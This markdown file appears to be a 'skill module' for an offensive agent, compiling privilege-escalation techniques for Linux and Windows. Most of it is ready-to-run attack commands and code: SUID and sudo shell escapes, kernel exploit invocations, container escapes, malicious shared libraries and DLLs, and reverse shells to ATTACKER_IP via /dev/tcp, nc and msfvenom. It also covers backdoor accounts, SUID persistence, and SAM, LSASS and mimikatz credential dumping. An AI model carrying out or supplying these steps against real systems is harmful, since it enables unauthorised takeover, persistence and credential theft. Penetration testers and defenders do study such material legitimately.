# Privilege Escalation Complete Arsenal

> **Bxploit Skill Module** — Comprehensive privilege escalation techniques for Linux and Windows targets.
> Covers enumeration, exploitation, and post-exploitation escalation paths.

---

## Table of Contents

1. [Linux Privilege Escalation](#linux-privilege-escalation)
   - [Automated Enumeration](#automated-enumeration)
   - [SUID / SGID Binaries](#suid--sgid-binaries)
   - [Linux Capabilities](#linux-capabilities)
   - [Cron Job Abuse](#cron-job-abuse)
   - [PATH Hijacking](#path-hijacking)
   - [Kernel Exploits](#kernel-exploits)
   - [Docker / Container Escape](#docker--container-escape)
   - [Sudoers Abuse](#sudoers-abuse)
   - [NFS no_root_squash](#nfs-no_root_squash)
   - [Writable /etc/passwd](#writable-etcpasswd)
   - [Shared Library Hijacking](#shared-library-hijacking-linux)
   - [Wildcard Injection](#wildcard-injection)
   - [LD_PRELOAD / LD_LIBRARY_PATH](#ld_preload--ld_library_path)
2. [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Automated Enumeration (Windows)](#automated-enumeration-windows)
   - [SeImpersonatePrivilege Abuse](#seimpersonateprivilege-abuse)
   - [PrintSpoofer](#printspoofer)
   - [JuicyPotato / RoguePotato / GodPotato](#juicypotato--roguepotato--godpotato)
   - [Unquoted Service Paths](#unquoted-service-paths)
   - [DLL Hijacking](#dll-hijacking)
   - [AlwaysInstallElevated](#alwaysinstallelevated)
   - [Token Impersonation](#token-impersonation)
   - [Weak Service Permissions](#weak-service-permissions)
   - [Registry Autoruns](#registry-autoruns)
   - [Stored Credentials & SAM Dump](#stored-credentials--sam-dump)

---

## Linux Privilege Escalation

### Automated Enumeration

Run these first on every Linux target to map all escalation vectors:

```bash
# LinPEAS — most comprehensive automated enumerator
curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t -e /tmp -r linreport.txt

# linux-exploit-suggester
./linux-exploit-suggester.sh --uname "$(uname -r)"

# linux-smart-enumeration (LSE)
./lse.sh -l 2 -i

# pspy — monitor processes/cron without root
./pspy64 -pf -i 1000
```

Quick manual checks:

```bash
id; whoami; hostname; uname -a
cat /etc/os-release
env | grep -iE 'pass|key|secret|token'
cat /etc/sudoers 2>/dev/null
sudo -l 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/cron*
cat /etc/fstab
mount | grep -i nfs
netstat -tlnp 2>/dev/null || ss -tlnp
```

---

### SUID / SGID Binaries

SUID binaries run as the file owner (often root). Any SUID binary that can read/write files, spawn shells, or execute commands is an escalation vector.

**Discovery:**

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Combined SUID+SGID
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Cross-reference with GTFOBins
# https://gtfobins.github.io/#+suid
```

**Exploitation — Common SUID Escalations:**

```bash
# --- nmap (old interactive mode) ---
nmap --interactive
!sh

# --- find ---
find . -exec /bin/sh -p \;

# --- vim ---
vim -c ':!/bin/sh'

# --- bash ---
# If bash has SUID:
bash -p

# --- python ---
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# --- perl ---
perl -e 'exec "/bin/sh";'

# --- env ---
env /bin/sh -p

# --- cp — overwrite /etc/passwd ---
# Generate password hash first:
openssl passwd -1 -salt xyz password123
# Copy a modified passwd file
cp /tmp/passwd_modified /etc/passwd

# --- pkexec (CVE-2021-4034 PwnKit) ---
# If pkexec is SUID (almost always is on older systems):
# Compile and run PwnKit exploit
gcc -o pwnkit pwnkit.c
./pwnkit

# --- Custom SUID binary — ltrace/strace analysis ---
ltrace ./custom_suid_binary 2>&1
strace ./custom_suid_binary 2>&1
strings ./custom_suid_binary
```

**Creating a SUID backdoor (post-exploit persistence):**

```bash
cp /bin/bash /tmp/.backdoor
chmod u+s /tmp/.backdoor
# Later:
/tmp/.backdoor -p
```

---

### Linux Capabilities

Capabilities split root privileges into granular units. A binary with specific caps can escalate without full SUID.

**Discovery:**

```bash
# Find binaries with capabilities set
getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3.11
```

**Exploitation by Capability:**

```bash
# --- cap_setuid (most dangerous — direct root) ---
# python3 with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid+ep
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# --- cap_dac_read_search (read any file) ---
# tar with cap_dac_read_search
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
cat /tmp/etc/shadow

# --- cap_dac_override (write any file) ---
# python3 with cap_dac_override
python3 -c '
f = open("/etc/passwd","a")
f.write("hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash\n")
f.close()
'

# --- cap_net_raw (packet sniffing) ---
# tcpdump with cap_net_raw
tcpdump -i eth0 -w /tmp/capture.pcap -c 1000

# --- cap_sys_ptrace (inject into processes) ---
# Inject shellcode into a root-owned process
python3 inject.py $(pgrep -f "root_process")

# --- cap_sys_admin (mount filesystems, bpf, etc.) ---
# Mount host filesystem from inside container
mount /dev/sda1 /mnt
cat /mnt/etc/shadow

# --- cap_setgid ---
python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'

# --- cap_chown (change file ownership) ---
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
cat /etc/shadow

# --- cap_fowner (bypass permission checks on file owner) ---
# Modify /etc/shadow permissions
chmod 777 /etc/shadow
```

---

### Cron Job Abuse

Cron jobs that run as root with writable scripts or relative paths are easy wins.

**Discovery:**

```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/

# User crontabs
crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Check for world-writable scripts referenced by cron
cat /etc/crontab | grep -v '^#' | awk '{print $NF}' | while read f; do
  ls -la "$f" 2>/dev/null
done

# Monitor for running cron jobs without root (pspy)
./pspy64
```

**Exploitation:**

```bash
# --- Writable cron script ---
# If /opt/cleanup.sh is run by root and writable by us:
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
# Wait for cron to fire, then:
/tmp/rootbash -p

# --- Reverse shell via cron ---
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/cleanup.sh

# --- Cron with wildcard in tar (wildcard injection) ---
# If cron runs: cd /var/backups && tar czf backup.tar.gz *
# Create payload files in /var/backups:
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /var/backups/shell.sh
touch /var/backups/--checkpoint=1
touch /var/backups/--checkpoint-action=exec=sh\ shell.sh

# --- Overwrite cron PATH ---
# If crontab has PATH=/home/user:/usr/bin and runs "backup.sh" (no abs path):
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

### PATH Hijacking

If a root-level process or SUID binary calls a command without absolute path, inject a malicious binary into a path we control.

```bash
# Identify vulnerable calls — strings/ltrace on SUID binary
strings /usr/local/bin/suid_binary | grep -E '^[a-z]'
ltrace /usr/local/bin/suid_binary 2>&1 | grep execve
strace /usr/local/bin/suid_binary 2>&1 | grep execve

# Example: SUID binary calls "service" without full path
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid_binary

# C version for stealth:
cat > /tmp/service.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc -o /tmp/service /tmp/service.c
export PATH=/tmp:$PATH
/usr/local/bin/suid_binary
```

---

### Kernel Exploits

Use when all other vectors fail. Match kernel version to known exploits.

```bash
# Identify kernel version
uname -r
uname -a
cat /proc/version

# Automated suggestion
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
```

**Major Kernel Exploits Reference:**

| CVE | Name | Kernels | Notes |
|-----|------|---------|-------|
| CVE-2021-4034 | PwnKit (pkexec) | All with polkit | Nearly universal, not kernel but runs as root |
| CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11 | Overwrite read-only files |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 | Heap overflow in sudo |
| CVE-2016-5195 | DirtyCow | 2.6.22 – 4.8.3 | Race condition, write to read-only mappings |
| CVE-2019-13272 | PTRACE_TRACEME | 4.10 – 5.1.17 | ptrace vulnerability |
| CVE-2017-16995 | eBPF verifier | 4.4 – 4.14 | Ubuntu-specific eBPF bypass |
| CVE-2022-2588 | DirtyCred | 5.x | Credential replacement |
| CVE-2023-0386 | OverlayFS | 5.11 – 6.2 | Overlay copy-up flaw |
| CVE-2023-32233 | Netfilter nf_tables | 5.x – 6.3.1 | Use-after-free |
| CVE-2024-1086 | Netfilter nf_tables | 5.14 – 6.6 | Universal LPE via nft |

```bash
# DirtyPipe — CVE-2022-0847
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 "$(printf 'hacker:$1$xyz$hash:0:0::/root:/bin/bash\n')"

# DirtyCow — CVE-2016-5195
gcc -pthread -o dirtycow dirtycow.c -lcrypt
./dirtycow /etc/passwd

# PwnKit — CVE-2021-4034
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit

# Baron Samedit — CVE-2021-3156
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# Use pre-compiled exploit for target distro version
```

---

### Docker / Container Escape

**Detection — Am I in a container?**

```bash
cat /proc/1/cgroup 2>/dev/null | grep -qi docker && echo "DOCKER"
ls -la /.dockerenv 2>/dev/null && echo "DOCKER"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i container
hostname  # Random hex = likely container
```

**Escape Techniques:**

```bash
# --- 1. Privileged container (--privileged) ---
# Mount host filesystem
fdisk -l  # Find host disk
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
# Full host access at /mnt/host
chroot /mnt/host /bin/bash

# --- 2. Docker socket mounted (-v /var/run/docker.sock) ---
# Check for socket
ls -la /var/run/docker.sock
# Spawn privileged container from inside container
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
# Or without docker binary, use curl:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}' \
  http://localhost/containers/create

# --- 3. Writable cgroup notify_on_release ---
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# --- 4. SYS_ADMIN capability + apparmor=unconfined ---
mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/upper,workdir=/tmp/work /mnt

# --- 5. Host PID namespace (--pid=host) ---
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# --- 6. Docker group membership (on the host) ---
# If current user is in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

### Sudoers Abuse

**Discovery:**

```bash
sudo -l
# Look for: (ALL) NOPASSWD: /usr/bin/something
# Look for: (root) /usr/bin/something
# Look for: env_keep+=LD_PRELOAD
# Look for: !root exclusions that can be bypassed
```

**Exploitation — GTFOBins Sudo Entries:**

```bash
# --- vim ---
sudo vim -c '!sh'

# --- find ---
sudo find /etc -exec /bin/bash \;

# --- awk ---
sudo awk 'BEGIN {system("/bin/bash")}'

# --- less / more ---
sudo less /etc/hosts
!/bin/bash

# --- man ---
sudo man man
!/bin/bash

# --- nmap ---
sudo nmap --interactive
!sh
# Or: echo 'os.execute("/bin/bash")' > /tmp/nmap.nse && sudo nmap --script=/tmp/nmap.nse

# --- python / python3 ---
sudo python3 -c 'import os; os.system("/bin/bash")'

# --- perl ---
sudo perl -e 'exec "/bin/bash";'

# --- ruby ---
sudo ruby -e 'exec "/bin/bash"'

# --- env ---
sudo env /bin/bash

# --- wget (overwrite files) ---
# Host malicious passwd on attacker, overwrite:
sudo wget http://ATTACKER_IP/passwd -O /etc/passwd

# --- apache2 (read first line of files) ---
sudo apache2 -f /etc/shadow
# Error message leaks the first line

# --- tee (write to any file) ---
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd

# --- zip ---
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"

# --- git ---
sudo git -p help config
!/bin/bash

# --- knife (Chef) ---
sudo knife exec -E 'exec "/bin/bash"'

# --- mysql ---
sudo mysql -e '\! /bin/bash'

# --- ssh ---
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x

# --- nano ---
sudo nano
# Ctrl+R -> Ctrl+X -> command to execute

# --- journalctl ---
sudo journalctl
!/bin/bash

# --- systemctl ---
sudo systemctl
!sh
```

**LD_PRELOAD Abuse (when env_keep includes LD_PRELOAD):**

```c
// /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/allowed_program
```

---

### NFS no_root_squash

When NFS exports have `no_root_squash`, the remote root user retains root permissions on the share.

```bash
# --- On TARGET: check NFS exports ---
cat /etc/exports
# Look for: /shared *(rw,no_root_squash)
showmount -e TARGET_IP

# --- On ATTACKER (as root): ---
mkdir /tmp/nfs_mount
mount -t nfs TARGET_IP:/shared /tmp/nfs_mount -o nolock

# Method 1: SUID shell
cp /bin/bash /tmp/nfs_mount/rootbash
chmod u+s /tmp/nfs_mount/rootbash
# On target:
/shared/rootbash -p

# Method 2: SUID C binary
cat > /tmp/nfs_mount/suid.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF
gcc -o /tmp/nfs_mount/suid /tmp/nfs_mount/suid.c
chmod u+s /tmp/nfs_mount/suid
# On target:
/shared/suid
```

---

### Writable /etc/passwd

If `/etc/passwd` is world-writable — instant root.

```bash
# Check permissions
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt bx password123
# Output: $1$bx$LsLzMHbRvEym9v6GoVjXR/

# Method 1: Add new root user
echo 'bxroot:$1$bx$LsLzMHbRvEym9v6GoVjXR/:0:0:bx:/root:/bin/bash' >> /etc/passwd
su bxroot  # password: password123

# Method 2: Replace root's password hash
# Copy root line, change the 'x' to a hash:
sed -i 's/^root:x:/root:$1$bx$LsLzMHbRvEym9v6GoVjXR/:/' /etc/passwd
su root  # password: password123

# Method 3: Replace root's UID user (if can't edit root line)
echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
su backdoor  # No password needed
```

---

### Shared Library Hijacking (Linux)

```bash
# Find missing shared libraries for SUID binaries
ldd /usr/local/bin/suid_binary 2>/dev/null | grep "not found"
strace /usr/local/bin/suid_binary 2>&1 | grep "open.*\.so.*ENOENT"

# If binary searches /tmp or writable dir for a .so:
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c
# Trigger the SUID binary
/usr/local/bin/suid_binary
```

---

### Wildcard Injection

When scripts use wildcards with `tar`, `chown`, `rsync`, `chmod`, etc:

```bash
# --- tar wildcard injection ---
# If a root script runs: tar czf /tmp/backup.tar.gz *
echo 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash shell.sh"

# --- chown wildcard injection ---
# If root runs: chown user:user *
touch -- "--reference=/etc/passwd"

# --- rsync wildcard injection ---
# If root runs: rsync -e 'ssh' * target:/backup
touch -- "-e sh shell.sh"
```

---

### LD_PRELOAD / LD_LIBRARY_PATH

When `sudo -l` shows `env_keep+=LD_LIBRARY_PATH`:

```bash
# Find shared library of allowed program
ldd /usr/sbin/allowed_program

# Create malicious replacement for any listed .so
cat > /tmp/libhijack.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libhijack.so /tmp/libhijack.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/allowed_program
```

---

## Windows Privilege Escalation

### Automated Enumeration (Windows)

```powershell
# WinPEAS
.\winPEASany.exe quiet fast searchfast

# PowerUp (PowerSploit)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all -full

# SharpUp
.\SharpUp.exe

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended

# Manual quick checks
whoami /all
whoami /priv
net user %USERNAME%
net localgroup administrators
systeminfo
wmic os get caption,version,buildnumber
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

---

### SeImpersonatePrivilege Abuse

Service accounts (IIS AppPool, SQL Server, NETWORK SERVICE) usually have this privilege. It allows impersonating any token the process can obtain.

```powershell
# Check privileges
whoami /priv
# Look for: SeImpersonatePrivilege — Enabled

# Decision tree:
# Windows 10/Server 2019+ → PrintSpoofer or GodPotato
# Windows 7/Server 2008/2012/2016 → JuicyPotato
# Windows Server 2019 (no print) → RoguePotato
# Any modern Windows → GodPotato (most universal)
```

---

### PrintSpoofer

Works on **Windows 10 / Server 2016-2019+** when SeImpersonatePrivilege is enabled. Abuses the print spooler service.

```powershell
# Interactive shell
.\PrintSpoofer64.exe -i -c cmd

# Reverse shell
.\PrintSpoofer64.exe -c "c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# Execute command
.\PrintSpoofer64.exe -c "cmd /c whoami > c:\temp\whoami.txt"

# Add admin user
.\PrintSpoofer64.exe -c "cmd /c net user bxadmin P@ss123! /add && net localgroup administrators bxadmin /add"
```

---

### JuicyPotato / RoguePotato / GodPotato

**JuicyPotato** — Windows 7/8/Server 2008/2012/2016 (needs a valid CLSID):

```powershell
# Basic usage
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -t *

# Specify CLSID (required, varies by OS — get from juicy-potato CLSID list)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > c:\temp\whoami.txt" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Common CLSIDs:
# Windows 10 Pro: {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# Windows Server 2016: {8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
# Windows Server 2012: {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

**RoguePotato** — Windows Server 2019 / Windows 10 1809+:

```powershell
# Requires attacker machine to relay (socat on port 135)
# On attacker:
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999

# On target:
.\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -l 9999
```

**GodPotato** — Works on .NET 4+ (Windows 2012 – 2022, broadest coverage):

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

**SweetPotato** — Combined approach:

```powershell
.\SweetPotato.exe -e EfsRpc -p c:\temp\nc.exe -a "ATTACKER_IP 4444 -e cmd.exe"
```

---

### Unquoted Service Paths

When a service binary path contains spaces and is not quoted, Windows searches each partial path — place a malicious binary at an earlier match.

```powershell
# Discovery
wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

# PowerShell
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike "C:\Windows\*" -and $_.PathName -notlike '"*' -and $_.PathName -match '.* .*' } | Select-Object Name, PathName, StartMode

# PowerUp
Get-UnquotedService

# Example: Service path = C:\Program Files\My App\Service\binary.exe
# Windows will try:
#   C:\Program.exe
#   C:\Program Files\My.exe
#   C:\Program Files\My App\Service\binary.exe

# Check write permissions on each intermediate directory
icacls "C:\Program Files"
icacls "C:\Program Files\My App"
icacls "C:\Program Files\My App\Service"

# If C:\Program Files\My App\ is writable:
# Create payload as: C:\Program Files\My App\Service.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Service.exe
copy Service.exe "C:\Program Files\My App\Service.exe"

# Restart the service (if permissions allow)
sc stop "MyService"
sc start "MyService"
# Or wait for system reboot if auto-start
```

---

### DLL Hijacking

Windows applications search for DLLs in a predictable order. If we can place a DLL in a higher-priority location, it gets loaded instead.

**DLL Search Order (Standard):**
1. Application directory
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

```powershell
# Discovery: Find missing DLLs with Process Monitor (procmon)
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Find services with writable install directories
.\accesschk64.exe /accepteula -wvuqc "Authenticated Users" * -s 2>nul
icacls "C:\Program Files\VulnApp\"

# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll

# Manual DLL (minimal — calls original + adds payload)
# dllmain.cpp
```

```c
// Malicious DLL source
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user bxadmin P@ss123! /add");
        system("cmd.exe /c net localgroup administrators bxadmin /add");
    }
    return TRUE;
}
```

```powershell
# Compile on attacker (cross-compile):
x86_64-w64-mingw32-gcc dllmain.c -shared -o hijack.dll

# Place DLL in target directory
copy hijack.dll "C:\Program Files\VulnApp\missing.dll"
# Trigger by restarting the service or application
```

**Phantom DLL Hijacking (DLL that doesn't exist anywhere):**

```powershell
# Common phantom DLLs to target:
# wlbsctrl.dll — IKEEXT service
# wbemcomn.dll — various WMI
# TSMSISrv.dll — SessionEnv service
# TSVIPSrv.dll — SessionEnv service

# Check if IKEEXT is set to auto-start:
sc qc IKEEXT
# Place wlbsctrl.dll in C:\Windows\System32\ (if writable) or in PATH
```

---

### AlwaysInstallElevated

When both machine and user registry keys are set to 1, any `.msi` package installs with SYSTEM privileges.

```powershell
# Check registry keys (both must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerUp check
Get-RegistryAlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# Install silently
msiexec /quiet /qn /i evil.msi

# Add admin user via MSI (without msfvenom — pure WiX)
# Create WiX XML, compile with candle/light, deploy

# Alternative: PowerUp exploitation
Write-UserAddMSI
```

---

### Token Impersonation

Steal tokens from other logged-in users or services to assume their identity.

```powershell
# --- Meterpreter ---
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
impersonate_token "DOMAIN\Administrator"

# --- PowerShell (Invoke-TokenManipulation) ---
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\admin"
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"

# --- SharpToken ---
.\SharpToken.exe list
.\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd.exe

# --- Manual token theft via C (CreateProcessWithTokenW) ---
# Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
```

**Token types:**
- **Delegation tokens** — interactive logons (RDP, physical). Full impersonation.
- **Impersonation tokens** — non-interactive (service, net drive mapping). Limited to local impersonation.

---

### Weak Service Permissions

```powershell
# Check all service permissions with accesschk
.\accesschk64.exe /accepteula -uwcqv "Authenticated Users" * 2>nul
.\accesschk64.exe /accepteula -uwcqv "Everyone" * 2>nul
.\accesschk64.exe /accepteula -uwcqv "Users" * 2>nul
.\accesschk64.exe /accepteula -uwcqv "%USERNAME%" * 2>nul

# PowerUp
Get-ModifiableService

# If SERVICE_CHANGE_CONFIG is available:
sc config VulnService binpath= "cmd /c net user bxadmin P@ss123! /add && net localgroup administrators bxadmin /add"
sc stop VulnService
sc start VulnService

# If service binary itself is writable:
icacls "C:\Program Files\VulnApp\service.exe"
# Replace with msfvenom payload
move service.exe service.exe.bak
copy payload.exe service.exe
sc stop VulnService
sc start VulnService

# Restore after exploitation
move service.exe.bak service.exe
```

---

### Registry Autoruns

```powershell
# Query autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on autorun binaries
.\accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun\program.exe"

# If writable, replace with payload
copy /y payload.exe "C:\Program Files\Autorun\program.exe"
# Wait for admin login or reboot

# PowerUp
Get-ModifiableRegistryAutoRun
```

---

### Stored Credentials & SAM Dump

```powershell
# Saved credentials
cmdkey /list
# If admin creds are stored:
runas /savecred /user:Administrator "cmd /c c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# SAM/SYSTEM extraction (requires admin or Volume Shadow Copy)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security
# Transfer to attacker, then:
impacket-secretsdump -sam sam -system system -security security LOCAL

# Volume Shadow Copy (if not admin but can access shadow copies)
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# LSASS dump (requires admin/SYSTEM)
# Method 1: Task Manager → Details → lsass.exe → Create dump file
# Method 2: Procdump
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# Method 3: comsvcs.dll
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $(Get-Process lsass).Id C:\temp\lsass.dmp full
# Offline: mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords

# DPAPI credential extraction
mimikatz # vault::cred
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\<GUID>

# Unattend.xml & Sysprep (plaintext/base64 passwords)
findstr /si password *.xml *.ini *.txt *.cfg 2>nul
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\Unattend.xml
```

---

## Quick Reference Decision Matrix

### Linux PrivEsc Priority Order

| Priority | Check | Command |
|----------|-------|---------|
| 1 | Sudo misconfiguration | `sudo -l` |
| 2 | SUID/SGID binaries | `find / -perm -4000 2>/dev/null` |
| 3 | Capabilities | `getcap -r / 2>/dev/null` |
| 4 | Cron jobs (writable scripts) | `cat /etc/crontab; ls -la /etc/cron*` |
| 5 | Writable /etc/passwd | `ls -la /etc/passwd` |
| 6 | NFS no_root_squash | `cat /etc/exports` |
| 7 | Docker group / container escape | `id; ls /.dockerenv` |
| 8 | PATH hijacking in SUID/cron | `strings` on binaries; `pspy` |
| 9 | Kernel exploit | `uname -r` → exploit-suggester |

### Windows PrivEsc Priority Order

| Priority | Check | Command |
|----------|-------|---------|
| 1 | Privileges (SeImpersonate etc.) | `whoami /priv` |
| 2 | Stored credentials | `cmdkey /list` |
| 3 | AlwaysInstallElevated | `reg query` both keys |
| 4 | Weak service permissions | `accesschk64.exe -uwcqv` |
| 5 | Unquoted service paths | `wmic service get pathname` |
| 6 | DLL hijacking | Process Monitor / `icacls` |
| 7 | Registry autoruns (writable) | `reg query Run keys` |
| 8 | SAM/credentials in files | `findstr /si password` |
| 9 | Token impersonation | `incognito` / SharpToken |

---

## Key Tools Reference

| Tool | Platform | Purpose | URL |
|------|----------|---------|-----|
| LinPEAS | Linux | Automated enumeration | github.com/peass-ng/PEASS-ng |
| WinPEAS | Windows | Automated enumeration | github.com/peass-ng/PEASS-ng |
| pspy | Linux | Process snooping w/o root | github.com/DominicBreuker/pspy |
| GTFOBins | Linux | SUID/sudo/cap abuse ref | gtfobins.github.io |
| LOLBAS | Windows | Living-off-the-land binaries | lolbas-project.github.io |
